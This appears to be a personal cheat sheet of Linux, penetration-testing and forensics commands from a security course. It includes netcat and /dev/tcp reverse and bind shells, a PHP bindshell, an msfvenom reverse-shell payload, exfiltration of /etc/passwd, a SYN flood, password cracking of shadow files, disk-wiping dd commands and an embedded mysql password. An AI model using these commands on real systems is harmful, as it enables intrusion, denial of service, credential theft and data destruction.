<!-- START doctoc generated TOC please keep comment here to allow auto update -->
<!-- DON'T EDIT THIS SECTION, INSTEAD RE-RUN doctoc TO UPDATE -->

- [Important CLI commands & hacks for fun and profit](#important-cli-commands--hacks-for-fun-and-profit)
  - [Google searches](#google-searches)
  - [Kali USB bootable](#kali-usb-bootable)
  - [Command line stuff](#command-line-stuff)
    - [Important folders and files](#important-folders-and-files)
    - [Basics](#basics)
    - [Networking](#networking)
    - [Discs & Forensics](#discs--forensics)
      - [Info about disks & their sizes](#info-about-disks--their-sizes)
      - [Copy/Backup files or disks](#copybackup-files-or-disks)
      - [WIPE a disk (CAUTION)](#wipe-a-disk-caution)
      - [Filesystems](#filesystems)
      - [Recover data](#recover-data)
      - [Sleuth Kit](#sleuth-kit)
      - [log2timeline](#log2timeline)
      - [RAM](#ram)
    - [GDB](#gdb)

<!-- END doctoc generated TOC please keep comment here to allow auto update -->

# Important CLI commands & hacks for fun and profit

This document contains important cli commands, pen testing tools, forensic hacks and more!

## Google searches

`site:foo.de inurl:wp-admin`

## Kali USB bootable

- https://gist.github.com/malixsys/97b35ed8899a99561b19da9a1dcfa96c
- https://linuxconfig.org/make-a-kali-linux-persistent-usb

## Command line stuff

### Important folders and files

```bash
/etc/password
/etc/shadow
/var/log
/usr/share/wordlists/ -> kali wordlists (locate wordlists)
less  /usr/share/wordlists/rockyou.txt # good for passwords (kali)
```

### Basics

```bash
# german keyboard layout
setxkbmap -layout de # -> move to ~/.bash_rc

# word count
wc -w hacks.md

# find stuff
locate stuff
find /some/path/ -name "stuff"
find /some/path/ -name "*.js"

# SUID bit - find binaries with the SUID bit set
find / -perm -4000 -type f 2>/dev/null

# find files by content
egrep -ir --include=*.{php,html,js} "(document.cookie|setcookie)" /some/path/
find /some/path/ -type f -name "*.php" -o -name "*.html" -o -name "*.js" | \
 xargs egrep -i '(document\.cookie|console.log)'| less

# find content in files
egrep 'some-string' hacks.md
# search domains
egrep '(www\.)?.*\.[a-z]{2,6}(\.[a-z]{2,4})?' hacks.md
# search IP addresses
egrep '([0-9]{1,3}\.){3}[0-9]{1,3}' hacks.md

# file info: (is it really a txt file?)
file ~/Desktop/foo.txt
/Users/foo/Desktop/foo.txt: PDF document, version 1.3 # (😁 pdf was just renamed to foo.txt)

# time stuff
uptime
date
uptime

# execute stuff with timeout
timeout 10 ping foo.de

# hashsums
sha256sum package.json

# random numbers
echo $RANDOM

# execute in background
stress-ng --cpu 2 &
...do other stuff
# bring it back to foreground to kill it
fg

# Restart services
service apache2 restart
sudo systemctl restart mysql

# get distro/linux version
cat /etc/*-release
lsb_release -a
uname -a
uname -mrs
cat /proc/version

# caesar chiffre
tr "A-Za-z" "N-ZA-Mn-za-m" < text.txt > encrypted.txt
tr "A-Za-z" "N-ZA-Mn-za-m" < encrypted.txt > text.txt
```

### Networking

```bash
hostname -A
ip addr
nmcli
nmcli device show
nmcli connection show

# Active Internet connections (including servers)
netstat -at
ifconfig

netstat -tunp

# Routing tables
netstat -r -n

# ARP table
arp -a

# displays the route a packet took to reach the host
traceroute google.com

# logged in users on system
w
who -T
last
finger

# all processes
ps -ef
lsof

ss -at
# check open ports on a host
ss -tln
ss -lun

# Which process is listening in port 4444
lsof -i tcp:4444

# SSL certificates
openssl req -new -newkey rsa:2048 -days 365 -nodes -x509 -keyout server.key -out server.crt -config configs/server.conf

openssl req -new -newkey rsa:2048 -days 365 -nodes -x509 -keyout client.key -out client.crt -config configs/client.conf

# infos about the certs
openssl x509 -in server.crt -text -noout
openssl x509 -in client.crt -text -noout

# ALSO CHECK NETCAT (nc) BELOW!

# finds emails of a domain
theHarvester -d mwager.de -b google

# Domain enumeration
sublist3r -d hs-augsburg.de

# DNS stuff
nslookup -type=ns hs-augsburg.de
Server: 10.0.2.3
Address: 10.0.2.3#53

Non-authoritative answer:
hs-augsburg.de nameserver = deneb.dfn.de.
hs-augsburg.de nameserver = av2.RZ.FH-Augsburg.de.
hs-augsburg.de nameserver = primestation.RZ.FH-Augsburg.de.

dig MX hs-augsburg.de
dig AXFR domain nameserver
host -l hs-augsburg.de nameserver
host  hs-augsburg.de av2.RZ.FH-Augsburg.de

nslookup -type=mx lecture2.local 10.5.13.21
nslookup -type=soa internal-lecture.local 10.5.13.21

# scanning
- arping -n -i HOST # sudo
- tcpdump # wireshark light -> sudo tcpdump -n -i eth0
- ICMP -> ping

# nmap
# -A Enable OS detection, version detection, script scanning, and traceroute
nmap -v -A scanme.nmap.org

# scan network ports: -sn: Ping Scan - disable port scan
nmap -v -sn scanme.nmap.org/16

# -sV -> check services running!
nmap -v -A -sV scanme.nmap.org

# nmap scannt per default 1000 well known ports!
# Scann ALL PORTS:
sudo nmap -A -sV -T5 10.5.123.0/24 -p- # also "-p-"

# execute a SYN flooding attack
sudo timeout 10 hping3 -S --flood 192.168.13.13

# get ip and mac of neighbour
ip neigh

# netcat (nc) - TCP/IP swiss army knife

nc 10.5.123.202 41414
ac9e06fafa7d76bade9106541dc4165dfb18155b580e2ab11924926f9583164a

# start netcat server
# listen on port 4444 (e.g. on my host)
nc -lnvp 4444

# if I can upload a php file and get it to execute: shell access via bindshell
# php bindshell:
system("nc -lnvp 4444 -e /bin/bash");

# SEND file content (eg executables) to a server
# server:
nc -lnvp 4444 > foobar.txt
# client:
nc IP PORT < /etc/passwd

# GET file content (eg password files) from a server
# server:
nc -lnvp 4444 < /etc/passwd
# client:
nc IP PORT > some_file

# scp
scp -r UserName@SourceHost:SourceDirectoryPath TargetFolderName

# SHELL via nc ❤️❤️❤️
# On Host:
nc -l -p 4444 -e /bin/bash
# Client:
ss -tln
nc 127.0.0.1 4444
whoami
root
...HAHAHAHAH

# /dev/tcp
echo "HALLO" >&/dev/tcp/127.0.0.1/4444
bash -i >& /dev/tcp/127.0.0.1/4444 0>&1

# python shells
python -c 'import pty; pty.spawn("/bin/sh")'

# kali: /usr/share/webshells 😁
# -> locate webshell

# Other tool: man socat ;)

# Other tool: Creating a Custom Reverse Shell
msfvenom -p linux/x64/shell_reverse_tcp - f elf LHOST=10.5.155.80 LPORT=4444 > shell

- bind shell: server waits for me to connect
- reverse shell: I am waiting for e command on the server to connect to my listener


# Find URLs/directories on hosts

- DirBuster (UI. check with /usr/share/wordlists/dirb/small.txt)
- CLI:
dirb https://mwager.de/ /usr/share/wordlists/dirb/small.txt -v

oder

gobuster dir --url https://mwager.de/ -w /usr/share/wordlists/dirb/small.txt
gobuster dir --url 10.5.22.8 -w /usr/share/wordlists/dirb/small.txt

# Burb Suite -> perform attacks on web applications
- TODO

mysql --host=10.5.134.178 --user=important_user --password=52991835a76dc17085dcfdf27159bc4a228d53fe91e695031704ff1a5e2a786b

# Nikto Web Scanner
# Scan web servers in search of vulnerabilities and common dangerous configurations
nikto -h https://mwager.de

# skipfish
# Find vulnerabilities in web apps.
rm -rf /tmp/skip
touch new_dict.wl
skipfish -t 90 -i 90 -w 90 -f1000 -b f -o /tmp/skip -W ./new_dict.wl http://testphp.vulnweb.com

# Wapiti
# Find vulnerabilities in web apps.
wapiti  -v 1  -u http://testphp.vulnweb.com/ -f txt -o /tmp/wapiti --flush-session

# whatweb
# Get information from hosts: e.g. apache vX.X, jQuery vx.X, modernizr, IP adress etc...
whatweb -v mwager.de
whatweb -v 192.168.0.1/24

# Wordpress
wpscan --url http://wordpress-installation.com

# SMB STUFF - find samba shared network devices

nmap -p 139,445 192.168.2.120
sudo nbtscan -r 192.168.2.120
enum4linux -a 192.168.2.120

# SNMP - simple network management protocol
nmap -sU -p 161 <network>
snmpwalk -v1 IP -c public iso.3.6.1.2.1.1.1.0
# get running processes:
snmpwalk -v1 10.5.81.65 -c public 1.3.6.1.2.1.25.4.2.1.2


# find smtp users
nc -c IP 25
VRFY root # -> answer: does user "root" exist or not?
-> also possible via lists
smtp-user-enum -M VRFY -U /usr/share/wordlists/metasploit/namelist.txt  -t 10.5.72.178
# mit -D für die domain!
smtp-user-enum -M VRFY -U /usr/share/wordlists/npt_list.txt -t 10.5.72.178 -D mailserv

# Generate wordlist from website (Custom Word List generator)
cewl -w generated_wordlist.txt -d 1 -m 5 https://mwager.de

# Password cracking: hydra
man hydra
# also:
crunch, john the ripper etc...
john --wordlist=/usr/share/wordlists/npt_list.txt shadow-file # eg /etc/shadow

# ARP stuff: use bettercap!

# SQL injection: sqlmap
sqlmap -u example.com/login?user=a&pass=b
```

### Discs & Forensics

```bash
strings /some/binary/fat.raw | less
strings /dev/sdb | less

# Mounting etc
mount -t hfs /dev/disk2s1 /tmp

# get filesystem
fstyp /dev/disk2s1 # partition meines usb sticks
```

#### Info about disks & their sizes

```bash
# mounted stuff
mount -v
ls /media # ls /Volumes

df -H
lsblk

# Disk size
du -sh /some/path
> 42G	/some/path

# OSX
# Output all devices
diskutil list # also spits out the mount names (e.g. "Macintosh HD" or "USBSTICK")
diskutil unmountDisk /dev/disk2

# Get partitions of a disk
sudo fdisk -l /dev/sda

# Get detailed infos about a disk
sudo hdparm -I /dev/sda
sudo ewfacquire /dev/sda
```

#### Copy/Backup files or disks

```bash
dd if=/dev/sda of=/path/to/my/backup

# forensics extension of dd (e.g. hashing check auto!)
dc3dd if=/dev/sda hof=/path/to/my/backup.raw hash=sha256

# -> FTK Imager is GUI & free (win only)

# over ssh - copy stuff encrypted and gzipped to my ssh server
dd if=/dev/sda | pv | gzip -c | ssh USER@IP "cat > sda.dd"
# also see sshfs ?!

# EWF (Expert witness format)
ewfaquire -t image.dd image.E01
ewfexport image.E01
```

#### WIPE a disk (CAUTION)

```bash
dd if=/dev/zero of=/dev/sdb(1) # wipe whole disk or just a partition
dd if=/dev/random of=/dev/sdb
# specialized tool:
dc3dd wipe=/dev/sdb

# hex editor (hexeditor)
# verify that our command to write zeros to a whole disk was a success?
# xxd is a cli hex editor
xxd -a /dev/sdb
```

#### Filesystems

```bash
# MBR (Master boot record) - Sector 0 (partition infos, attack vector...)
# Bootcode Byte 0-439
# Disksignature Byte 440-443
# reserved Byte 444-445
# Partitiontable Byte 446-509 (4 x 16byte)
# Signature 0x55 0xAA 510-511
# Copy only the MBR:
sudo dd if=/dev/disk2 of=ntfs.raw bs=512 count=1 skip=0
```

#### Recover data

Linux GUI for image analyse: dff (digital forensic framework) - similar to FTK imager

```bash
Tools for WIN: recuva, PC inspektor file recovery, DiskDigger, GlaryUndelete
Tools for MAC: Disk Drill
```

#### Sleuth Kit

```bash
# mmls - Display the partition layout of a volume system  (partition tables)
mmls image.dd

# ifind - Find the meta-data structure that has allocated a given disk unit or file name
# icat - Output the contents of a file based on its inode number

```

#### log2timeline

#### RAM

```bash
# Older unix:
dd if=/dev/ram of=ram.dd
# fmem: https://github.com/NateBrune/fmem
# osx: MacMemoryReader
# alternative via firewire (if pc locked (i.e. screensaver))
```

### GDB

1. mit scp die binary auf kali host downloadn
2. gdb ./flag-extramile4
3. > start
4. > disas

```
Dump of assembler code for function main:
0x00005555555551e6 <+0>: push rbp
0x00005555555551e7 <+1>: mov rbp,rsp
=> 0x00005555555551ea <+4>: sub rsp,0xe0
0x00005555555551f1 <+11>: mov DWORD PTR [rbp-0xd4],edi
0x00005555555551f7 <+17>: mov QWORD PTR [rbp-0xe0],rsi
0x00005555555551fe <+24>: lea rdi,[rip+0xe08] # 0x55555555600d
0x0000555555555205 <+31>: call 0x555555555050 <system@plt>
0x000055555555520a <+36>: test eax,eax
0x000055555555520c <+38>: jne 0x555555555238 <main+82>
0x000055555555520e <+40>: mov rax,QWORD PTR [rip+0x2e4b]
```

5. break \*0x000055555555520a
6. run
   -> breakt dann direkt bei \*0x000055555555520a

7. info reg eax

output 0

8. set $eax=1

WICHTIG: jne sprint wenn eax NICHT 0 is.
deshalb setzen wir eax einfach hart auf 1 HAHAHAHHAHAH

9. nun steppen bis wir den flag haben. NICE!!!
